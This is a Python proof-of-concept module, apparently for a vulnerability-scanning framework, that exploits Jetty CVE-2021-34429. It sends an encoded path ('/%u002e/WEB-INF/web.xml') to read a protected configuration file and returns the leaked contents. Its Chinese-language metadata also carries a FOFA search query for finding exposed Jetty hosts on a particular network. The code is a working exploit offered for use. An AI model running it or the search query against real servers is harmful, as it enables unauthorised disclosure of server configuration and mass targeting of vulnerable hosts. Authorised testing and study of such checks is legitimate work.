# coding:utf-8  
from urllib import request
import ssl
import chardet
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class POC(POCBase):
    
    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            这个POC不支持proxy哈哈，另外互联网测试成功案例很少，可以用vulhub来复现    
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Jetty WEB-INF文件读取漏洞(CVE-2021-34429)",                        # 漏洞名称
        "VulnID" : "CVE-2021-34429",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Jetty",                     # 漏洞应用名称
        "AppVersion" : """
            9.4.37 ≤ Eclipse Jetty ≤ 9.4.42
            10.0.1 ≤ Eclipse Jetty ≤ 10.0.5
            11.0.1 ≤ Eclipse Jetty ≤ 11.0.5
        """,                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            近日，深信服安全团队监测到Eclipse Jetty官方发布了一则漏洞安全通告，
            通告披露了Eclipse Jetty组件存在文件读取漏洞，漏洞编号：CVE-2021-34429。

            该漏洞是由于没有严格控制url输入产生，
            攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行文件读取攻击，
            最终可造成服务器敏感信息泄露。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="Jetty" && type="subdomain" && asn="4134"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    timeout = 10

    def _verify(self):
        vuln = [False,""]
        url = self.target + "/%u002e/WEB-INF/web.xml"  # url自己按需调整

        headers = {"User-Agent":get_random_ua(),}

        try:
            # verify
            context = ssl._create_unverified_context()
            req = request.Request(url,headers = headers)
            response = request.urlopen(req,timeout=self.timeout,context = context)
            html = response.read()

            status_code = response.getcode()

            if "<web-app>" in str(html) and status_code == 200 and "application/xml" in [_v for _k,_v in response.getheaders() if "Content-Type" in _k]:
                vuln = [True,html]
        except Exception as e:
            raise e
        
        return vuln

    def _attack(self):
        return self._verify()